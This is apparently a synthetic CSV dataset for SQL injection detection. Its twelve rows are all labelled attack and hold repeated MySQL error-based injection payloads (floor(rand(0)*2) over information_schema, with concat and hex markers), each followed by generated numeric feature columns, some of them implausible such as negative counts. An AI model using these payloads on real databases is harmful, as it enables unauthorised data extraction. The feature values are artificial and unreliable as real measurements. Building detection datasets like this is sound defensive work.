id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.765064274508827,297.6842346191406,96.0649642944336,42.38126754760742,102.2510757446289,14.067152976989746,97.74107360839844,35.50299835205078,1.2749494314193726,0.3737579882144928,0.14870761334896088,0.36762797832489014,0.13971737027168274,3.7746100425720215,2.0471079349517822,0.4815409183502197,0.5583792328834534,0.15677739679813385,-0.800329327583313,-0.3630845248699188,8.922355651855469,11.328093528747559,3.893986463546753,-0.047241371124982834,1.7332998514175415,0.3080849051475525,-0.670418381690979,0.48030325770378113,0.13490290939807892,0.5770837664604187,0.4545302987098694,-0.2857690155506134,1.390210509300232,0.28409168124198914,0.14179284870624542,2.3008782863616943,8.460737228393555,1.323590636253357,2.419480323791504,0.5118939280509949,0.5941873788833618,1.154273509979248,-0.07182974368333817,0.027214575558900833,-0.36861059069633484,0.38640424609184265,0.6604397892951965,0.38211697340011597,0.3649948239326477,0.11686964333057404,0.49951672554016113,0.4197976589202881,-0.13084743916988373,-0.4082787334918976,0.6663094162940979,0.07829704880714417,0.3194721043109894,0.20324352383613586,0.45060840249061584,-0.33286964893341064,-0.39394545555114746,0.13926133513450623,-0.21732446551322937,-0.3162074685096741,-0.013531647622585297,-0.23693609237670898,0.5745490789413452,-0.38298484683036804,0.29553961753845215,0.2076033353805542,-0.15939465165138245,0.25556182861328125,0.14130321145057678,-0.10730668902397156,0.4603384733200073,0.1914811134338379,0.23027458786964417,0.17983382940292358,-0.21093332767486572,0.0890686884522438,0.6743174195289612,11.4425687789917,0.4096769690513611,0.1940978765487671,0.10330559313297272,0.951772928237915,-0.31456130743026733,0.07350043952465057,-0.11090118438005447
GAN_000012,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.561070436383377,294.608642578125,95.18815612792969,39.104190826416016,107.10844421386719,10.168961524963379,95.27310943603516,35.85322570800781,0.9667354822158813,0.36180153489112854,0.16032089293003082,0.3729357421398163,0.1436890959739685,3.7933921813964844,1.8866890668869019,0.5258489847183228,0.39004606008529663,0.17854051291942596,-0.5754833221435547,-0.19485974311828613,8.833617210388184,10.730766296386719,3.9675121307373047,0.25627461075782776,1.7931677103042603,0.23147684335708618,-0.5428692102432251,0.5591692924499512,0.13445572555065155,0.6245815753936768,0.20200803875923157,-0.06205398589372635,1.3175729513168335,0.04963808134198189,0.1770218312740326,2.088890790939331,8.268424987792969,1.2456752061843872,2.0869736671447754,0.4218065142631531,0.5425535440444946,1.2736222743988037,-0.12080591171979904,-0.040737301111221313,-0.4807398021221161,0.230240136384964,0.4470037519931793,0.5025344491004944,0.5013210773468018,0.3250827491283417,0.550822913646698,0.44246459007263184,-0.13775871694087982,-0.04426545277237892,0.5905081629753113,0.13669833540916443,0.35942745208740234,0.205180823802948,0.3578481376171112,-0.17584620416164398,-0.23008142411708832,0.18671755492687225,0.09537011384963989,-0.19174522161483765,0.03336109593510628,-0.22120575606822968,0.7032343149185181,0.1753290742635727,0.29032301902770996,0.13543997704982758,-0.235862597823143,0.3367379307746887,0.14664201438426971,0.14363513886928558,0.28273046016693115,0.11376082897186279,0.36823466420173645,0.2641397714614868,-0.16105268895626068,0.09129290282726288,0.6392647624015808,10.920923233032227,0.5449270606040955,0.16677144169807434,0.06677759438753128,0.9317455291748047,-0.3088202476501465,0.07095594704151154,-0.2849608063697815
GAN_000013,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.4730712701643105,288.5079345703125,92.81783294677734,41.130680084228516,106.03740692138672,13.616959571838379,92.0901107788086,34.26618957519531,0.9008133411407471,0.3528690040111542,0.15195207297801971,0.37972256541252136,0.1386406570672989,3.8396005630493164,2.0362179279327393,0.9159010648727417,0.46506112813949585,0.2284320890903473,-0.49926772713661194,-0.15357603132724762,8.676331520080566,11.029200553894043,4.16174840927124,0.15300828218460083,1.7577331066131592,0.2633800804615021,-0.5333795547485352,0.30243760347366333,0.15767882764339447,0.7993150353431702,0.24178461730480194,-0.25006526708602905,1.5911201238632202,-0.050112538039684296,0.2311393767595291,2.1347484588623047,8.129337310791016,1.0211478471755981,2.5168135166168213,0.5815744400024414,0.48059841990470886,1.0810344219207764,0.008662717416882515,0.004229621030390263,-0.2932598292827606,0.04124273732304573,0.46790942549705505,0.5269596576690674,0.41329291462898254,0.27332186698913574,0.45091938972473145,0.393821656703949,-0.1299726665019989,-0.24438199400901794,0.5966911911964417,0.12647242844104767,0.3504890203475952,-0.05067116767168045,0.38768893480300903,-0.29536962509155273,-0.5641897320747375,0.2749522924423218,-0.026903804391622543,-0.16960975527763367,0.21660514175891876,-0.12046632915735245,0.7264000177383423,-0.018527019768953323,0.21378007531166077,0.21533659100532532,-0.1096130907535553,0.3097675144672394,0.08049355447292328,-0.048989735543727875,0.390180379152298,0.12140676379203796,0.5323628783226013,0.3360707759857178,-0.0538860484957695,0.05763084813952446,0.5989059209823608,11.446696281433105,0.5963853597640991,0.2039497047662735,0.06611966341733932,0.9151166081428528,-0.07388858497142792,0.15650591254234314,-0.2423255443572998
GAN_000014,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,5.669065360896824,295.69580078125,94.4914779663086,43.84882354736328,110.2022476196289,15.591255187988281,90.89542388916016,37.6353874206543,1.072576880455017,0.3477250337600708,0.15266798436641693,0.373603880405426,0.13988088071346283,3.817862033843994,2.2222330570220947,0.5873386859893799,0.7076523900032043,0.21987758576869965,-0.5902281403541565,-0.29407691955566406,9.411170959472656,11.51542854309082,3.350990056991577,0.05411706119775772,1.694685935974121,0.2545287609100342,-0.5413618087768555,0.4952062666416168,0.10844514518976212,0.6735599637031555,0.49662256240844727,-0.23708808422088623,1.3548460006713867,0.14092382788658142,0.22067195177078247,2.194230556488037,8.419095993041992,1.1029932498931885,2.490797519683838,0.5150580406188965,0.546931803226471,1.154415249824524,-0.06624329090118408,-0.0019883019849658012,-0.013112079352140427,0.17293578386306763,0.2613811194896698,0.49621957540512085,0.3526307940483093,0.37706509232521057,0.474454790353775,0.4959675073623657,-0.11661116778850555,-0.1769360452890396,0.6204496026039124,0.06511471420526505,0.392790287733078,0.21130216121673584,0.4139501452445984,-0.28139305114746094,-0.14276601374149323,0.3625093400478363,-0.09425465762615204,-0.29539793729782104,0.10617584735155106,-0.2781156599521637,0.5983287692070007,-0.14031009376049042,0.1015806496143341,0.11692832410335541,-0.1283492147922516,0.3991442620754242,0.10398805886507034,-0.15952323377132416,0.36893969774246216,0.23687595129013062,0.44736501574516296,0.2961452007293701,-0.1498580276966095,0.07787994295358658,0.622340977191925,11.051225662231445,0.547217071056366,0.2299569696187973,0.06302884966135025,0.7921586632728577,0.07265583425760269,0.19919368624687195,-0.014686748385429382
GAN_000015,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.456265823542746,296.50726318359375,96.25466918945312,41.41632843017578,106.89959716796875,14.62584400177002,93.3626708984375,34.81902313232422,1.1018199920654297,0.3606748580932617,0.14850649237632751,0.37024828791618347,0.13820931315422058,3.8714847564697266,1.8758504390716553,0.617252767086029,0.4847579896450043,0.22173655033111572,-0.6018493175506592,-0.22617456316947937,9.340971946716309,10.783534049987793,3.3506417274475098,-0.17123965919017792,1.722934603691101,0.22224661707878113,-0.4090699553489685,0.2279985249042511,0.0828043594956398,0.6834416389465332,0.4452645182609558,-0.26531094312667847,1.416990041732788,0.20352642238140106,0.23281599581241608,2.0708532333374023,8.111618995666504,1.058748483657837,2.2518138885498047,0.6510329842567444,0.5071985721588135,1.1816414594650269,-0.09502795338630676,0.0069764768704771996,-0.1706308126449585,0.14445114135742188,0.295003741979599,0.4882560968399048,0.2836013436317444,0.32197806239128113,0.4588640332221985,0.4842396378517151,-0.01684841886162758,-0.2961057424545288,0.6464892625808716,0.11624617129564285,0.39232003688812256,0.026569338515400887,0.41388168931007385,-0.4211089313030243,-0.30585378408432007,0.18949058651924133,0.014697842299938202,-0.1356823742389679,0.08442091196775436,-0.13494214415550232,0.6903051733970642,-0.00972985103726387,0.36012911796569824,0.0360778272151947,-0.22915154695510864,0.3799492418766022,0.1347777247428894,-0.23717035353183746,0.36712414026260376,0.10838507115840912,0.3809520900249481,0.33523088693618774,-0.1599942296743393,-0.00025929222465492785,0.6881910562515259,11.628911972045898,0.6179037690162659,0.23447352647781372,0.0689687579870224,0.7783242464065552,0.1937885284423828,0.20321296155452728,-0.12681445479393005
GAN_000016,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.992910583617253,300.4726257324219,97.44476318359375,41.14292907714844,110.49956512451172,21.906944274902344,94.97674560546875,33.83723068237305,1.1993300914764404,0.3678106963634491,0.15893030166625977,0.3649918735027313,0.143480122089386,3.8170292377471924,2.0518321990966797,0.6641497611999512,0.5741967558860779,0.3003530502319336,-0.7991264462471008,-0.5103901028633118,8.191216468811035,11.911643028259277,3.2433786392211914,-0.05515763536095619,1.686090111732483,0.3342995345592499,-0.6643489599227905,0.43481090664863586,0.08635061979293823,0.4824397563934326,0.7367294430732727,-0.5065425038337708,1.29710054397583,0.36494800448417664,0.1449386328458786,1.9791531562805176,8.155664443969727,1.0927448272705078,2.247511386871338,0.6932851672172546,0.6403715014457703,1.103905439376831,0.0023578102700412273,0.016729509457945824,-0.3658515214920044,0.12640684843063354,0.2559697926044464,0.5901460647583008,0.30046188831329346,0.2078506499528885,0.5001872181892395,0.4406709372997284,-0.15761807560920715,-0.5108618140220642,0.6499362587928772,0.07000390440225601,0.5019080638885498,0.1560012847185135,0.44295620918273926,-0.5849905610084534,-0.23988769948482513,0.24783450365066528,-0.020595300942659378,-0.14277876913547516,-0.06315785646438599,-0.42726263403892517,0.7160838842391968,-0.2737186849117279,0.38120943307876587,0.2011878490447998,-0.19677050411701202,0.7141645550727844,0.25059232115745544,-0.07729431986808777,0.6693906784057617,0.07737109810113907,0.33087047934532166,0.25826799869537354,-0.29286062717437744,0.04875868558883667,0.8045216798782349,12.065056800842285,0.5004673004150391,0.22215145826339722,0.047952938824892044,0.8547881841659546,0.13651230931282043,0.20169085264205933,-0.3685048222541809
GAN_000017,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.655593526537113,284.51263427734375,92.37568664550781,41.20288848876953,103.55319213867188,14.026298522949219,88.407470703125,36.15272903442383,0.9424733519554138,0.34596356749534607,0.15295682847499847,0.37850579619407654,0.1405070424079895,3.8045270442962646,1.8546600341796875,0.6339953541755676,0.6815629005432129,0.34028539061546326,-0.6484506726264954,-0.27156221866607666,8.774011611938477,11.31981086730957,3.0999374389648438,-0.07803657650947571,1.5715279579162598,0.3051682412624359,-0.5091110467910767,0.32555723190307617,0.10114311426877975,0.4837813973426819,0.46297913789749146,-0.27509260177612305,1.3905577659606934,-0.04168959707021713,0.13654842972755432,2.1135659217834473,7.940982818603516,1.0700072050094604,2.4986510276794434,0.6567407250404358,0.5204905867576599,1.2151117324829102,-0.022013850510120392,0.01787753216922283,-0.15922051668167114,0.07837564498186111,0.46296000480651855,0.46860453486442566,0.26762855052948,0.3246746063232422,0.41582661867141724,0.3883538544178009,0.03697201982140541,-0.32085150480270386,0.6665005683898926,0.09345421195030212,0.42145684361457825,0.186653733253479,0.3503451347351074,-0.4389967620372772,-0.27313175797462463,0.33949247002601624,0.06494425237178802,-0.15158119797706604,-0.0031611844897270203,-0.23418167233467102,0.6740993857383728,-0.193756565451622,0.20489472150802612,-0.11996372789144516,-0.02234889194369316,0.3965529799461365,0.08019599318504333,-0.30616018176078796,0.546375036239624,0.3047085106372833,0.4919208884239197,0.34415924549102783,-0.23975731432437897,0.055067915469408035,0.6195968985557556,11.238445281982422,0.5863365530967712,0.20417721569538116,0.08817155659198761,0.8661435842514038,0.26549315452575684,0.2507043182849884,-0.22530078887939453
GAN_000018,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.402833492176542,294.1687927246094,91.09296417236328,39.5505485534668,107.15967559814453,12.791971206665039,90.14283752441406,36.111026763916016,0.9216171503067017,0.35258620977401733,0.14715270698070526,0.3785174489021301,0.13801373541355133,3.8493454456329346,2.0168616771698,0.6240178942680359,0.5079688429832458,0.21700569987297058,-0.3665473759174347,-0.14082762598991394,9.253938674926758,10.586749076843262,3.431915760040283,-0.005777180194854736,1.8785309791564941,0.24269449710845947,-0.34455937147140503,0.3031359016895294,0.16098016500473022,0.7799913883209229,0.3387150764465332,-0.15904487669467926,1.6492769718170166,0.055535949766635895,0.26683852076530457,2.0792179107666016,8.030181884765625,1.0194096565246582,2.3653697967529297,0.5982432961463928,0.5099218487739563,1.186068058013916,-0.0631750151515007,-0.0031316345557570457,-0.14872348308563232,0.20898133516311646,0.21121105551719666,0.5011832118034363,0.3363637328147888,0.4319567382335663,0.499196857213974,0.4255124628543854,0.025333832949399948,-0.21050728857517242,0.6131716966629028,0.12521642446517944,0.3195241093635559,-0.05152690410614014,0.2933581471443176,-0.367580771446228,-0.24953725934028625,0.3606475591659546,0.18678361177444458,-0.20135986804962158,0.08553767204284668,-0.3278738260269165,0.6258339285850525,0.003008835017681122,0.1827302873134613,-0.0015818364918231964,-0.05145871639251709,0.2603779435157776,0.10047104209661484,-0.1658521592617035,0.29268068075180054,0.12526360154151917,0.5869752168655396,0.36203888058662415,-0.1098015159368515,0.06787943094968796,0.6345003843307495,11.03907585144043,0.6797705292701721,0.18793058395385742,0.0513048991560936,0.8319408893585205,0.0888218954205513,0.18290019035339355,-0.02713993936777115
GAN_000019,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.556761700643705,295.59149169921875,95.42671203613281,39.25236511230469,105.87557983398438,15.312395095825195,97.47245788574219,32.88624572753906,0.8167779445648193,0.3648041784763336,0.1604696363210678,0.3693377673625946,0.14173971116542816,3.840019464492798,2.132789373397827,0.6849139928817749,0.36920636892318726,0.2637230455875397,-0.8227730393409729,-0.2517019212245941,8.550071716308594,10.816256523132324,4.226689338684082,0.27373358607292175,1.651441216468811,0.29569002985954285,-0.8430963754653931,0.5509040951728821,0.16513888537883759,0.585008442401886,0.2816452085971832,-0.2845294177532196,1.5517138242721558,0.025676026940345764,0.1803109347820282,2.137744426727295,8.392642974853516,1.2735878229141235,2.498887777328491,0.48193836212158203,0.5562636852264404,1.1896439790725708,0.016130032017827034,-0.031865157186985016,-0.5046816468238831,0.3368381857872009,0.705487072467804,0.43422022461891174,0.4074915945529938,0.18174226582050323,0.4992736279964447,0.30983084440231323,-0.04060989245772362,-0.3599507212638855,0.6399062275886536,0.10008407384157181,0.45278432965278625,-0.0514814555644989,0.40614190697669983,-0.26919975876808167,-0.4630456268787384,0.34114253520965576,0.016082681715488434,-0.17872971296310425,0.22251854836940765,-0.3086842894554138,0.7474061846733093,0.08126543462276459,0.3274949789047241,0.25295671820640564,-0.19974754750728607,0.5263675451278687,0.22874130308628082,0.1361510008573532,0.39611634612083435,0.18675276637077332,0.3937027156352997,0.2075265645980835,-0.24483400583267212,0.04751401022076607,0.7174558043479919,11.874896049499512,0.46598020195961,0.2145775854587555,0.06915585696697235,1.0053082704544067,-0.19922590255737305,0.2869817912578583,-0.22865474224090576
GAN_000020,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.71864518256094,301.9984436035156,92.12287902832031,41.14588928222656,110.85851287841797,13.756717681884766,89.18797302246094,35.261478424072266,1.0544785261154175,0.35885289311408997,0.15707255899906158,0.369136244058609,0.14551761746406555,3.839613914489746,2.0439956188201904,0.6000919342041016,0.49840250611305237,0.22134974598884583,-0.38126787543296814,-0.3415217697620392,8.899330139160156,10.856865882873535,3.8267135620117188,0.15248964726924896,1.9303886890411377,0.21047741174697876,-0.284810334444046,0.4276144504547119,0.11907406151294708,0.7304202914237976,0.26003485918045044,0.03314872458577156,1.3830082416534424,0.18663926422595978,0.2706291079521179,2.128181219100952,8.339449882507324,1.1131579875946045,2.2723281383514404,0.408143550157547,0.5759563446044922,0.9954792857170105,-0.037570707499980927,-0.012607737444341183,-0.2843778431415558,0.242025226354599,0.27919402718544006,0.5416412949562073,0.446029931306839,0.36974555253982544,0.5951623320579529,0.5412023663520813,-0.08167598396539688,-0.07529293745756149,0.6033544540405273,0.07842154800891876,0.3312283754348755,-0.06354930251836777,0.38633909821510315,-0.34037792682647705,-0.26161253452301025,0.22627446055412292,-0.05081314593553543,-0.16250382363796234,0.08595260232686996,-0.22074370086193085,0.6773157119750977,0.0177801214158535,0.2908828854560852,0.12711772322654724,-0.22028137743473053,0.3963138461112976,0.11045574396848679,0.015562158077955246,0.2805766463279724,0.008985824882984161,0.39772292971611023,0.2968039810657501,-0.17091919481754303,0.08262604475021362,0.6690158843994141,11.089263916015625,0.5939187407493591,0.2103704810142517,0.04107213020324707,0.8497150540351868,-0.011020459234714508,0.056592658162117004,-0.06878476589918137
GAN_000021,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.684782232079417,300.6906433105469,94.44966888427734,42.53096008300781,114.33956909179688,15.943035125732422,93.20722198486328,33.928932189941406,0.964688777923584,0.3630821704864502,0.1421765387058258,0.3693365454673767,0.1299642026424408,3.841291666030884,2.553297281265259,0.7262974381446838,0.5672081112861633,0.22356797754764557,-0.6659043431282043,-0.22164395451545715,9.541217803955078,11.974284172058105,3.7050979137420654,0.019629213958978653,1.794256329536438,0.27381429076194763,-0.6442872285842896,0.3914363384246826,0.1550457775592804,0.9292281270027161,0.4595458507537842,-0.3880438208580017,1.4417634010314941,0.30812370777130127,0.23209789395332336,2.106065511703491,8.276126861572266,1.1181049346923828,2.7936625480651855,0.6654183864593506,0.6075565814971924,1.0414316654205322,0.030463842675089836,-0.03642158955335617,-0.012367703020572662,0.22338420152664185,0.22087104618549347,0.4376446604728699,0.3316473960876465,0.3690001368522644,0.5132158398628235,0.44507160782814026,-0.11891691386699677,-0.21147800981998444,0.630394458770752,0.07193564623594284,0.44694364070892334,-0.08722630888223648,0.5464537143707275,-0.5549309849739075,-0.39748451113700867,0.4596337080001831,0.0019135773181915283,-0.2673697769641876,0.12755276262760162,-0.4020213186740875,0.5829254388809204,-0.3014703392982483,0.16116850078105927,0.3302222192287445,-0.2256472110748291,0.5942676663398743,0.45517292618751526,-0.10858018696308136,0.5408384799957275,0.14931020140647888,0.39109179377555847,0.1822153776884079,-0.0677008330821991,0.01682601496577263,0.7198270559310913,11.669240951538086,0.4704910218715668,0.29437369108200073,0.060251787304878235,0.8551169633865356,0.02786683291196823,0.31171995401382446,0.03907657042145729
GAN_000022,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,5.773281846943419,298.1343994140625,93.43633270263672,42.30686950683594,113.02517700195312,11.735309600830078,88.80012512207031,36.20038986206055,1.024948239326477,0.3571954071521759,0.15664026141166687,0.38140273094177246,0.13756872713565826,3.845470905303955,1.7501074075698853,0.6687667369842529,0.5821722745895386,0.2141961306333542,-0.5182397365570068,-0.21118324995040894,9.296516418457031,11.813888549804688,3.3942363262176514,0.08681878447532654,1.7845770120620728,0.2323649376630783,-0.2981966435909271,0.5014268159866333,0.11203323304653168,0.7183135151863098,0.40204960107803345,-0.13471631705760956,1.4086321592330933,0.03543335199356079,0.2462761402130127,2.1234700679779053,8.675827980041504,1.1449512243270874,2.3512260913848877,0.32653021812438965,0.5456202030181885,1.0141372680664062,-0.11634953320026398,-0.030731095001101494,0.04206598550081253,0.1681574136018753,0.23244597017765045,0.5062512755393982,0.3904780149459839,0.5005301833152771,0.47922781109809875,0.47956129908561707,-0.1572456806898117,0.1288338154554367,0.6625615358352661,0.13789723813533783,0.34410589933395386,0.01177208125591278,0.21250057220458984,-0.3741687834262848,-0.11638934910297394,0.2094559371471405,0.24936512112617493,-0.10282902419567108,0.003374651074409485,-0.2504322826862335,0.7210882306098938,-0.044977109879255295,0.2454272359609604,0.01719401776790619,-0.11618978530168533,0.29267439246177673,0.2339736968278885,0.002531815320253372,0.3615906536579132,0.29608452320098877,0.4819779396057129,0.2622111737728119,-0.16926158964633942,0.037858668714761734,0.5809161067008972,11.129905700683594,0.6243114471435547,0.28970950841903687,0.09656400233507156,0.7435041666030884,-0.019759688526391983,0.2261848747730255,-0.14365234971046448
